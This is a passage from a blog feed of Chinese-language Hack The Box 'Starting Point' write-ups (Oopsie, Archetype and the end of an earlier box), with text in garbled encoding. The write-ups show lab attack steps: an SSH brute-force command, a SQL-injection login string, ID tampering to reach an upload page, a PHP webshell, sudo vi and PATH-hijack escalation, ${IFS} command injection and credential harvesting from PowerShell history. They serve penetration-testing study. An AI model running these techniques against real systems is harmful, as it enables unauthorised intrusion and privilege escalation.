src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302102938607.png" alt="image-20210302102938607"></p></li></ul><p>user.txt</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103249535.png" alt="image-20210302103249535"></p><ul><li>  ä¸‡èƒ½çš„ç™¾åº¦</li></ul><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302100939553.png" alt="image-20210302100939553"></p><p>æ–‡ä»¶è¯»å–</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302101000333.png" alt="image-20210302101000333"></p><p>æ–‡ä»¶å†™å¤±è´¥äº†ã€‚ã€‚ã€‚</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>åœ¨<code>/var/www/html/dashboard.php</code>ä¸­ï¼Œæœ‰å½“å‰ç”¨æˆ·<code>postgres</code>çš„å¯†ç </p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103407792.png" alt="image-20210302103407792"></p><p>sshå»ºç«‹è¿æ¥</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103509012.png" alt="image-20210302103509012"></p><p><code>sudo -l</code>å‘ç°å¯ä»¥å…å¯†è¿è¡Œ<code>/bin/vi /etc/postgresql/11/main/pg_hba.conf</code>ï¼Œvi æ˜¯å¯ä»¥å¾—åˆ°ä¸€ä¸ª<code>/bin/bash</code>çš„</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103649670.png" alt="image-20210302103649670"></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103724396.png" alt="image-20210302103724396"></p><p>å¾—åˆ°rootæƒé™</p><p>flag:</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103748836.png" alt="image-20210302103748836"></p>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> hack the box </category>
          
          <category> start point </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> hack the box </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>box:Oopsie</title>
      <link href="/box_Oopsie.html"/>
      <url>/box_Oopsie.html</url>
      
        <content type="html"><![CDATA[<p>ä»é›¶å¼€å§‹çš„hack_the_box ç”Ÿæ´»</p><a id="more"></a><h1 id="Oopsie"><a href="#Oopsie" class="headerlink" title="Oopsie"></a>Oopsie</h1><ul><li>  é¶æœºï¼š <code>10.10.10.28</code></li><li>  æ”»å‡»æœºï¼š<code>10.10.14.88</code></li></ul><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.10.10.28 -A</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 19:19 EST</span><br><span class="line">Nmap scan report for 10.10.10.28</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)</span><br><span class="line">|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)</span><br><span class="line">|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Welcome</span><br></pre></td></tr></table></figure><p>è™½ç„¶åº”è¯¥æ˜¯çˆ†ç ´ä¸å‡ºæ¥çš„ï¼Œä½†æ˜¯çœ‹åˆ°22ç«¯å£å°±ä¹ æƒ¯æ€§çš„çˆ†ç ´ä¸€ä¸‹å§ï¼Œä¸‡ä¸€å°±è¿›å»äº†å‘¢</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P /usr/share/wordlist/rockyou.txt</span><br></pre></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>è®¿é—®ä¸€ä¸‹webæœåŠ¡</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302082954260.png" alt="image-20210302082954260"></p><p>å•¥ä¹Ÿæ²¡æœ‰ï¼Œæ‰€æœ‰çš„é“¾æ¥éƒ½è·³è½¬ä¸äº†ã€‚</p><h3 id="ç›®å½•ä¿¡æ¯æ”¶é›†"><a href="#ç›®å½•ä¿¡æ¯æ”¶é›†" class="headerlink" title="ç›®å½•ä¿¡æ¯æ”¶é›†"></a>ç›®å½•ä¿¡æ¯æ”¶é›†</h3><p>æ¥ä¸‹æ¥çš„çªç ´å£æœ‰ä¸¤ç§ï¼š</p><ul><li>  æ‰«ç›®å½•ï¼Œé‡åˆ°webç«™ç‚¹æ‰«ä¸€ä¸‹ç›®å½•ï¼Œè¿æ°”å¥½çš„è¯èƒ½æ‰«å‡ºå¥½å¤šæœ‰ç”¨çš„ä¸œè¥¿ã€‚çœŸå®ç¯å¢ƒä¸­è¦æ³¨æ„çº¿ç¨‹æ•°å’Œè®¿é—®é€Ÿåº¦ï¼Œå¤ªå¿«çš„è¯é‡åˆ°waf/cdnä¼šè¢«banã€‚è¿™ä¸ªè¿‡ç¨‹å¯ä»¥ä½¿ç”¨<code>dirsearch</code>â€”â€”<a href="https://github.com/maurosoria/dirsearch">githubåœ°å€</a></li><li>  çœ‹å‰ç«¯æºä»£ç ï¼Œjsæ–‡ä»¶ä¸­é€šå¸¸ä¼šæš´éœ²å¾ˆå¤šè·¯ç”±å’Œæ¥å£ä¿¡æ¯ï¼Œé€šè¿‡æŸ¥çœ‹jsæ–‡ä»¶ï¼Œå¯ä»¥æ”¶é›†å­åŸŸåå’Œç›®å½•ä¿¡æ¯ã€‚è¿™ä¸ªè¿‡ç¨‹å¯ä»¥ä½¿ç”¨<code>JSFinder</code>æ¥åšâ€”â€”<a href="https://github.com/Threezh1/JSFinder">githubåœ°å€</a></li></ul><h3 id="ç™»å½•çª—å£"><a href="#ç™»å½•çª—å£" class="headerlink" title="ç™»å½•çª—å£"></a>ç™»å½•çª—å£</h3><p>è¿™é‡Œä½¿ç”¨ç¬¬äºŒç§æ–¹æ³•ï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç ä¹‹åï¼Œåœ¨æœ€ä¸‹é¢å‘ç°äº†ï¼š</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302083525395.png" alt="image-20210302083525395"></p><p>è®¿é—®<code>/cdn-cgi/login</code>:</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302083603915.png" alt="image-20210302083603915"></p><p>å¯¹äºç™»å½•æ¡†ï¼Œæ¥ä¸‹æ¥è¦ä¹ˆæ˜¯sqlæ³¨å…¥ï¼Œè¦ä¹ˆæ˜¯çˆ†ç ´å¼±å¯†ç ï¼ˆæˆ‘æ˜¯çœŸæ²¡æƒ³åˆ°æ˜¯ä¸Šä¸€é“é¢˜çš„å¯†ç å•Šï¼‰</p><ul><li>  å¦‚æœæ˜¯sqlæ³¨å…¥ï¼Œå¯ä»¥å°è¯•ä¸‡èƒ½å¯†ç <code>&#39;||1||&#39;</code>ï¼Œæˆ–è€…ç›´æ¥ä½¿ç”¨sqlmapè·‘ä¸€ä¸‹</li><li>  å¦‚æœæ˜¯å¼±å¯†ç ï¼ŒburpæŠ“åŒ…åï¼Œä½¿ç”¨çˆ†ç ´æ¨¡å—å³å¯</li></ul><p>å¯†ç æ˜¯ä¸Šé¢˜å¾—åˆ°çš„<code>MEGACORP_4dm1n!!</code></p><h3 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h3><p>ç™»å½•ä¹‹åï¼Œé€‰é¡¹å¡ä¸­æœ‰ä¸€ä¸ª<code>upload</code>ï¼Œä½†æ˜¯éœ€è¦super adminæƒé™</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302084039939.png" alt="image-20210302084039939"></p><p>è¯•è¯•å…¶ä»–çš„åŠŸèƒ½ï¼Œç¬¬ä¸€ä¸ª<code>Account</code>ï¼Œå¯ä»¥çœ‹åˆ°è‡ªå·±çš„<code>Access ID</code>ï¼Œæ˜¯é€šè¿‡ä¼ å…¥<code>id</code>å˜é‡çš„å½¢å¼ï¼Œå¹¶ä¸”cookieä¿å­˜çš„ä¿¡æ¯å°±æ˜¯è¿™ä¸ª<code>Access ID</code>ã€‚</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302084521198.png" alt="image-20210302084521198"></p><p>å°è¯•sqlæ³¨å…¥æˆ–è€…è¶Šæƒè®¿é—®</p><ul><li><p>sqlæ³¨å…¥ï¼š</p><ul><li>  ç›´æ¥ä½¿ç”¨sqlmapè·‘ä¸€ä¸‹ï¼Œæ˜¾è€Œæ˜“è§çš„ï¼Œå¤±è´¥äº†ã€‚</li><li>  æ‰‹åŠ¨åŠ å…¥ å•å¼•å·ã€åŒå¼•å·ã€åˆ†å·ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œæ²¡æœ‰æŠ¥é”™ä¿¡æ¯ã€‚</li></ul></li><li><p>è¶Šæƒè®¿é—®ï¼š</p><ul><li><p>ä¿®æ”¹<code>id</code>å˜é‡çš„å€¼ï¼Œidä¸º4çš„æ—¶å€™å‡ºç°äº†å¦ä¸€ä¸ªç”¨æˆ·</p><p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302084649936.png" alt="image-20210302084649936"></p><p>  ä½†æ˜¯ä»–ä¸æ˜¯super adminï¼Œç»§ç»­ã€‚</p><p>  ç›´åˆ°<code>id=30</code>çš„æ—¶å€™ï¼Œsuper adminçš„<code>Access ID</code>å‡ºæ¥äº†</p><p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302084736069.png" alt="image-20210302084736069"></p><p>  ä¿®æ”¹è‡ªå·±çš„cookieä¸ºè¿™ä¸ªå€¼ï¼Œè®¿é—®<code>uploads</code>é€‰é¡¹å¡</p><p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302084933102.png" alt="image-20210302084933102"></p><p>  è®¿é—®åˆ°äº†<code>uploads</code>ï¼Œè¶ŠæƒæˆåŠŸã€‚</p><p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302085019626.png" alt="image-20210302085019626"></p></li></ul></li></ul><p>æ¥ä¸‹æ¥çš„æ–‡ä»¶ä¸Šä¼ æ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰ä¿æŠ¤æªæ–½</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302085233423.png" alt="image-20210302085233423"></p><p>ä½†æ˜¯ä¸Šä¼ çš„è·¯å¾„ä¸çŸ¥é“</p><ul><li>  é çŒœï¼Œé€šå¸¸éƒ½æ˜¯<code>/upload</code> æˆ– <code>/uploads</code> æˆ– <code>/uploadfiles</code>è¿™ç§çš„æ ·å­</li><li>  ç›®å½•æ‰«æçš„æ—¶å€™æ‰«å‡ºç±»ä¼¼çš„ç›®å½•</li></ul><p>å’±è¿™é‡Œç”¨çŒœçš„ï¼Œè®¿é—®<code>/uploads/shell.php</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302085426082.png" alt="image-20210302085426082"></p><p><a href="https://github.com/AntSwordProject/AntSword-Loader">èšå‰‘</a>è¿ä¸Šwebshell</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302085731375.png" alt="image-20210302085731375"></p><p>å¾—åˆ°ç¬¬ä¸€ä¸ªflagï¼Œåœ¨<code>/home/robert/user.txt</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302085857872.png" alt="image-20210302085857872"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><h3 id="robert"><a href="#robert" class="headerlink" title="robert"></a>robert</h3><p>åœ¨<code>/var/www/html/login/db.php</code>ä¸­å‘ç°å¯†ç </p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302091843922.png" alt="image-20210302091843922"></p><p>sshè¿æ¥</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302092355879.png" alt="image-20210302092355879"></p><h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>Linuxææƒçš„è‹¥å¹²æ–¹æ³•ï¼š</p><ul><li><p>setuidï¼Œå…·æœ‰sæƒé™çš„æ–‡ä»¶åœ¨è¿è¡Œæ—¶å¦‚æœä»£ç ä¸­è°ƒç”¨äº†<code>setuid</code>å‡½æ•°ï¼Œé‚£ä¹ˆä¼šæ”¹å˜è‡ªå·±çš„uidï¼Œå¦‚æœè¿™ä¸ªç¨‹åºèƒ½æ‰“å¼€ä¸€ä¸ªshellï¼Œé‚£ä¹ˆå¯ä»¥å¾—åˆ°setuidå¯¹è±¡çš„æƒé™</p><ul><li><p>ä½¿ç”¨å‘½ä»¤<code>find / -perm -u=s -type f 2&gt;/dev/null</code></p><p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302090516559.png" alt="image-20210302090516559"></p></li></ul></li><li><p>  sudoå…å¯†è¿è¡Œï¼Œå¤§è‡´åŸç†åŒä¸Š</p></li><li><p>  dockerç»„ç”¨æˆ·é€šè¿‡dockerææƒï¼Œé€šè¿‡æŒ‚è½½é©±åŠ¨çš„å½¢å¼ææƒ</p></li><li><p>  å†…æ ¸æ¼æ´ï¼Œè¿™ä¸ªå°±ä¸å¤šè¯´äº†ã€‚</p></li><li><p>  è®¡åˆ’ä»»åŠ¡ï¼Œå‡è®¾rootç”¨æˆ·æ¯åˆ†é’Ÿä¼šè¿è¡Œä¸€æ¬¡<code>/tmp/a</code>ï¼Œå¹¶ä¸”è¯¥æ–‡ä»¶å¯å†™ï¼Œé‚£å°±å¯ä»¥æ”¹å˜æ–‡ä»¶å†…å®¹ï¼Œå†æ¬¡è¿è¡Œå°±æ˜¯ä»»æ„ä»£ç æ‰§è¡Œã€‚</p></li></ul><p>ä¸Šé¢æ‰¾åˆ°çš„<code>bugtracker</code>å¯èƒ½æ˜¯çªç ´å£ï¼Œä¸‹è½½è¯¥æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªLinuxå¯æ‰§è¡Œæ–‡ä»¶ï¼Œç®€å•çš„åˆ†æå¯ä»¥ç›´æ¥ä½¿ç”¨<code>strings</code>ï¼Œæˆ–è€…idaåç¼–è¯‘</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302090926036.png" alt="image-20210302090926036"></p><p>è¿™é‡Œå¯ä»¥æœ‰ä¸¤ç§åˆ©ç”¨æ–¹æ³•</p><ul><li><p>åŠ«æŒcat</p><p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302092558352.png" alt="image-20210302092558352"></p><p>  é€šè¿‡ç¯å¢ƒå˜é‡çš„åŠ«æŒï¼Œè¾¾åˆ°æ‰§è¡Œå‘½ä»¤çš„æ•ˆæœ</p></li><li><p>å‘½ä»¤æ³¨å…¥</p><p>  v6å˜é‡ç›´æ¥æ‹¼æ¥åœ¨<code>cat /root/report</code>ä¹‹åï¼Œè¿è¡Œåœ¨systemå‡½æ•°ä¸­ï¼Œå­˜åœ¨å‘½ä»¤æ³¨å…¥</p><p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302093012476.png" alt="image-20210302093012476"></p><p>  ä½†æ˜¯ä¸èƒ½ç”¨ç©ºæ ¼ï¼Œå› ä¸º%sé‡åˆ°ç©ºæ ¼å°±ä¼šåœæ­¢ï¼Œæ‰¾ä¸ªç©ºæ ¼æ›¿ä»£å“<code>$&#123;IFS&#125;</code>å°±è¡Œ</p><p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302093359049.png" alt="image-20210302093359049"></p></li></ul><p>flag</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302093524570.png" alt="image-20210302093524570"></p>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> hack the box </category>
          
          <category> start point </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> hack the box </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>box:Archetype</title>
      <link href="/box_Archetype.html"/>
      <url>/box_Archetype.html</url>
      
        <content type="html"><![CDATA[<p>ä»é›¶å¼€å§‹çš„hack_the_box ç”Ÿæ´»</p><a id="more"></a><h1 id="Archetype"><a href="#Archetype" class="headerlink" title="Archetype"></a>Archetype</h1><ul><li>  é¶æœºï¼š <code>10.10.10.27</code></li><li>  æ”»å‡»æœºï¼š<code>10.10.14.34</code></li></ul><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/hack_the_box]</span><br><span class="line">â””â”€$ nmap 10.10.10.27 -A           </span><br><span class="line">Nmap scan report for 10.10.10.27</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds</span><br><span class="line">1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   Target_Name: ARCHETYPE</span><br><span class="line">|   NetBIOS_Domain_Name: ARCHETYPE</span><br><span class="line">|   NetBIOS_Computer_Name: ARCHETYPE</span><br><span class="line">|   DNS_Domain_Name: Archetype</span><br><span class="line">|   DNS_Computer_Name: Archetype</span><br><span class="line">|_  Product_Version: 10.0.17763</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2021-02-24T22:44:23</span><br><span class="line">|_Not valid after:  2051-02-24T22:44:23</span><br><span class="line">|_ssl-date: 2021-02-25T08:37:30+00:00; +1h20m38s from scanner time.</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h56m37s, deviation: 3h34m40s, median: 1h20m37s</span><br><span class="line">| ms-sql-info: </span><br><span class="line">|   10.10.10.27:1433: </span><br><span class="line">|     Version: </span><br><span class="line">|       name: Microsoft SQL Server 2017 RTM</span><br><span class="line">|       number: 14.00.1000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2017</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 1433</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)</span><br><span class="line">|   Computer name: Archetype</span><br><span class="line">|   NetBIOS computer name: ARCHETYPE\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2021-02-25T00:36:53-08:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-02-25T08:36:55</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 130.65 seconds</span><br></pre></td></tr></table></figure><p>æ‰«æç»“æœè¯´æ˜äº†ï¼š</p><ol><li> ç›®æ ‡æ˜¯<code>Windows Server 2019</code></li><li> smbå¯ä»¥ä½¿ç”¨guestç”¨æˆ·ç™»å½•</li><li> ç›®æ ‡ä½¿ç”¨äº†<code>mssql</code></li></ol><h2 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h2><p>ä»¥guestç”¨æˆ·ç™»å½•ç›®æ ‡æœºå™¨</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164220367.png" alt="image-20210225164220367"></p><p>å‘ç°ç›®æ ‡ä¸‹å­˜åœ¨backupsæ–‡ä»¶å¤¹å¯ä»¥è®¿é—®ã€‚</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164154992.png" alt="image-20210225164154992"></p><p>æŸ¥çœ‹ä¸€ä¸‹ä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164413390.png" alt="image-20210225164413390"></p><p>é‡Œé¢å†™åˆ°äº†mssqlçš„ç”¨æˆ·åå’Œå¯†ç </p><p>ä¸ç”¨çŒœéƒ½çŸ¥é“è‚¯å®šæ˜¯è¦ç”¨mssqlæ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ‹¿shell</p><h2 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h2><p>ç”±äºå¯¹mssqlç¼ºä¹è®¤çŸ¥å’Œäº†è§£ï¼Œä¸çŸ¥é“æ€ä¹ˆè¿æ¥ä¸Šå»ï¼Œå°±å°è¯•äº†ä¸€ä¸‹<code>msfconsole</code></p><p>çœ‹åˆ°æœ‰ä¸€ä¸ª<code>mssql_exec</code>ï¼Œå°±å†³å®šæ˜¯ä½ äº†å°ç«é¾™</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164550486.png" alt="image-20210225164550486"></p><p>è®¾ç½®å‚æ•°ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªæ³¨æ„ç‚¹ï¼š</p><blockquote><p>  SQL Serverçš„èº«ä»½éªŒè¯æ–¹å¼æœ‰ä¸¤ç§ï¼šæ“ä½œç³»ç»Ÿèº«ä»½éªŒè¯å’Œæ•°æ®åº“èº«ä»½éªŒè¯ï¼Œæ­¤å¤„çš„å‚æ•°å€¼åº”è¯¥æ˜¯æ“ä½œç³»ç»Ÿèº«ä»½éªŒè¯æ–¹å¼ï¼Œå…¶å‰åŠéƒ¨åˆ†ARCHETYPEæ˜¯é¶æœºçš„ä¸»æœºåï¼ŒååŠéƒ¨åˆ†sql_svcæ˜¯å…·æœ‰æ•°æ®åº“ç™»å½•æƒé™çš„æ“ä½œç³»ç»Ÿç”¨æˆ·åã€‚</p></blockquote><p>å¡äº†æˆ‘å¥½ä¹…</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164644591.png" alt="image-20210225164644591"></p><p>æ‰€ä»¥è¦æŠŠ<code>use_windows_authent</code>è®¾ç½®ä¸º<code>true</code>ï¼Œå¹¶ä¸”æŒ‰ç…§ä»–çš„è¦æ±‚è®¾ç½®<code>domain</code>(å›¾ä¸Šæœªæ ‡å‡º)ï¼Œç„¶å<code>exploit</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164957307.png" alt="image-20210225164957307"></p><p>å¯ä»¥çœ‹åˆ°<code>whoami</code>å‘½ä»¤å·²ç»æ‰§è¡ŒæˆåŠŸäº†</p><p>è¯¥ç”¨æˆ·çš„flagåœ¨<code>C:\Users\sql_svc\Desktop\user.txt</code>ï¼Œä½¿ç”¨<code>type</code> å‘½ä»¤è·å–</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225165118035.png" alt="image-20210225165118035"></p><p>è¿™å°±æ˜¯ç¬¬ä¸€ä¸ªflag</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ç¬¬ä¸€æ¬¡é‡åˆ°Windowsï¼Œè¦ææƒemmmï¼Œä¸çŸ¥é“è¯¥æ€ä¹ˆåŠã€‚</p><p>æŸ¥äº†æŸ¥wp</p><blockquote><p>  å¯ä»¥å‘ç°sql_svcåŒæ—¶æ˜¯æ“ä½œç³»ç»Ÿæ™®é€šç”¨æˆ·ã€æ•°æ®åº“å’Œæ•°æ®åº“æœåŠ¡ç”¨æˆ·ï¼Œå€¼å¾—å»æ£€æŸ¥é¢‘ç¹è®¿é—®çš„æ–‡ä»¶æˆ–å·²æ‰§è¡Œçš„å‘½ä»¤ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¥è®¿é—®PowerShellå†å²è®°å½•æ–‡ä»¶ï¼š</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225165415264.png" alt="image-20210225165415264"></p><p>ç„¶åå°±æ‡‚äº†ï¼Œè¿™é‡Œæš´éœ²å‡ºæ¥çš„è‚¯å®šæ˜¯ç”¨æˆ·åå’Œå¯†ç </p><p>ä½†æ˜¯è¿™ä¹Ÿæ²¡å¼€3389ï¼Œå’‹ç™»å½•windowså‘¢</p><p>wpä¸Šç»™äº†ä¸€ä¸ªå·¥å…·<code>psexec.py</code></p><p>ç™»å½•ä¸Šå»ï¼Œæ‹¿åˆ°æœ€åçš„flag</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225165607949.png" alt="image-20210225165607949"></p><h2 id="åæ€"><a href="#åæ€" class="headerlink" title="åæ€"></a>åæ€</h2><ul><li>  å¯¹äºWindowsçš„æ¸—é€ï¼ŒæŠ€æœ¯ä¸åˆ°ä½ï¼Œæœ‰å¾ˆå¤šæƒ…å†µä¸çŸ¥é“è§£å†³æ–¹æ¡ˆï¼ˆmssqlï¼Œææƒç­‰ï¼‰</li><li>  å¤ªè¿‡äºä¾èµ–å·¥å…·å’Œè„šæœ¬ï¼Œå¯¹åŸç†æ€§çš„çŸ¥è¯†äº†è§£ä¸æ·±å…¥</li></ul>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> hack the box </category>
          
          <category> start point </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> windows </tag>
            
            <tag> hack the box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¿¡æ¯æ”¶é›†çš„ä¸€äº›å§¿åŠ¿</title>
      <link href="/information.html"/>
      <url>/information.html</url>
      
